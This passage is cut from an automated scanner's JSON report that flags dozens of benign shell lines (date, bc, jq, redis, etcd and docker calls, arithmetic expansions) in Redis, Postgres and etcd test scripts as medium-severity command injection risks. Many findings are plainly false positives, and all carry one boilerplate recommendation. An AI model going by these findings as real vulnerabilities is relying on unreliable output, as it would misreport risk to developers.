        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 306,
        "issue": "Command substitution in shell",
        "evidence": "local subscribers=$($REDIS_CMD PUBLISH \"$channel\" \"test message\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "local acquired=$($REDIS_CMD SET \"$lock_key\" \"$lock_value\" NX EX 10)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 354,
        "issue": "Command substitution in shell",
        "evidence": "local reacquired=$($REDIS_CMD SET \"$lock_key\" \"other-token\" NX EX 10)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "local exists=$($REDIS_CMD EXISTS \"$lock_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "local released=$($REDIS_CMD EVAL \"$lua_script\" 1 \"$lock_key\" \"$lock_value\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 384,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 401,
        "issue": "Command substitution in shell",
        "evidence": "if ! $REDIS_CMD ZADD \"$leaderboard\" $((i * 100)) \"player:$i\" > /dev/null; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 409,
        "issue": "Command substitution in shell",
        "evidence": "local top_3=$($REDIS_CMD ZREVRANGE \"$leaderboard\" 0 2 WITHSCORES)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 418,
        "issue": "Command substitution in shell",
        "evidence": "local rank=$($REDIS_CMD ZREVRANK \"$leaderboard\" \"player:5\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 427,
        "issue": "Command substitution in shell",
        "evidence": "local score=$($REDIS_CMD ZSCORE \"$leaderboard\" \"player:5\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 445,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 446,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 456,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 465,
        "issue": "Command substitution in shell",
        "evidence": "local current=$($REDIS_CMD INCR \"$rate_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 484,
        "issue": "Command substitution in shell",
        "evidence": "local now=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 489,
        "issue": "Command substitution in shell",
        "evidence": "$REDIS_CMD ZADD \"$window_key\" $((now + i)) \"req:$i\" > /dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 493,
        "issue": "Command substitution in shell",
        "evidence": "$REDIS_CMD ZREMRANGEBYSCORE \"$window_key\" 0 $((now - window)) > /dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 496,
        "issue": "Command substitution in shell",
        "evidence": "local window_count=$($REDIS_CMD ZCARD \"$window_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 506,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 507,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 35,
        "issue": "Command substitution in shell",
        "evidence": "DB_PORT=$((5432 + (RANDOM % 1000)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 48,
        "issue": "Command substitution in shell",
        "evidence": "echo -e \"${GREEN}[$(date +'%H:%M:%S')]${NC} $*\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "-v \"$(pwd)/$MIGRATIONS_DIR:/flyway/sql\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 233,
        "issue": "Command substitution in shell",
        "evidence": "count=$(run_psql -t -c \"SELECT COUNT(*) FROM flyway_schema_history WHERE success = true;\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "version=$(migrate -database \"$db_url\" -path \"$MIGRATIONS_DIR\" version 2>&1 || echo \"unknown\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "tables=$(run_psql -t -c \"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public';\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "invalid_indexes=$(run_psql -t -c \"SELECT COUNT(*) FROM pg_index WHERE NOT indisvalid;\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"\\\"passed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"'),\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 373,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"\\\"failed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 382,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Passed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"')\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Failed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 384,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Warnings: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"warning\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 435,
        "issue": "Command substitution in shell",
        "evidence": "TOOL=$(detect_migration_tool \"$MIGRATIONS_DIR\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 475,
        "issue": "Command substitution in shell",
        "evidence": "failed_count=$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 35,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT ...\" [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 36,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query-file queries.sql [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare before.sql after.sql [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT * FROM users WHERE id = 123\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query-file queries.sql --iterations 20",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 58,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare slow_query.sql fast_query.sql",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 61,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT COUNT(*) FROM orders\" --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 141,
        "issue": "Command substitution in shell",
        "evidence": "local start=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 143,
        "issue": "Command substitution in shell",
        "evidence": "local exec_time=$(cat /tmp/bench_time_$$.txt)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 160,
        "issue": "Command substitution in shell",
        "evidence": "sum=$(echo \"$sum + $time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 161,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$time < $min\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$time > $max\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 169,
        "issue": "Command substitution in shell",
        "evidence": "local mean=$(echo \"scale=3; $sum / ${#times[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 172,
        "issue": "Command substitution in shell",
        "evidence": "IFS=$'\\n' sorted=($(sort -n <<<\"${times[*]}\"))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 176,
        "issue": "Command substitution in shell",
        "evidence": "local mid1=${sorted[$((count/2 - 1))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 177,
        "issue": "Command substitution in shell",
        "evidence": "local mid2=${sorted[$((count/2))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "median=$(echo \"scale=3; ($mid1 + $mid2) / 2\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 180,
        "issue": "Command substitution in shell",
        "evidence": "median=${sorted[$((count/2))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 186,
        "issue": "Command substitution in shell",
        "evidence": "local diff=$(echo \"$time - $mean\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 187,
        "issue": "Command substitution in shell",
        "evidence": "local squared=$(echo \"$diff * $diff\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "variance_sum=$(echo \"$variance_sum + $squared\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 190,
        "issue": "Command substitution in shell",
        "evidence": "local variance=$(echo \"scale=3; $variance_sum / ${#times[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 191,
        "issue": "Command substitution in shell",
        "evidence": "local stddev=$(echo \"scale=3; sqrt($variance)\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 205,
        "issue": "Command substitution in shell",
        "evidence": "\"times\": [$(IFS=,; echo \"${times[*]}\")]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "local mean=$(echo \"$results\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "local median=$(echo \"$results\" | jq -r '.median_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local min=$(echo \"$results\" | jq -r '.min_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 221,
        "issue": "Command substitution in shell",
        "evidence": "local max=$(echo \"$results\" | jq -r '.max_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "local stddev=$(echo \"$results\" | jq -r '.stddev_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "local iterations=$(echo \"$results\" | jq -r '.iterations')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 246,
        "issue": "Command substitution in shell",
        "evidence": "local results1=$(benchmark_query \"$query1\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "local results2=$(benchmark_query \"$query2\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "local mean1=$(echo \"$results1\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 252,
        "issue": "Command substitution in shell",
        "evidence": "local mean2=$(echo \"$results2\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "local improvement=$(echo \"scale=2; (($mean1 - $mean2) / $mean1) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "local speedup=$(echo \"scale=2; $mean1 / $mean2\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 278,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$mean2 < $mean1\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 280,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$mean2 > $mean1\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 302,
        "issue": "Command substitution in shell",
        "evidence": "query1=$(cat \"$COMPARE_FILE1\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 303,
        "issue": "Command substitution in shell",
        "evidence": "query2=$(cat \"$COMPARE_FILE2\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "results=$(benchmark_query \"$QUERY\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 311,
        "issue": "Command substitution in shell",
        "evidence": "query=$(cat \"$QUERY_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "results=$(benchmark_query \"$query\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 313,
        "issue": "Command substitution in shell",
        "evidence": "format_output \"$results\" \"$(basename \"$QUERY_FILE\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 88,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 108,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 114,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 120,
        "issue": "Command substitution in shell",
        "evidence": "-p \"$((2378 + i)):2379\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 121,
        "issue": "Command substitution in shell",
        "evidence": "-p \"$((2478 + i)):2380\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 141,
        "issue": "Command substitution in shell",
        "evidence": "for attempt in $(seq 1 30); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "local value=$(docker exec etcd-node1 etcdctl get test-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "local value2=$(docker exec etcd-node2 etcdctl get test-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "local lease_id=$(docker exec etcd-node1 etcdctl lease grant 10 | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
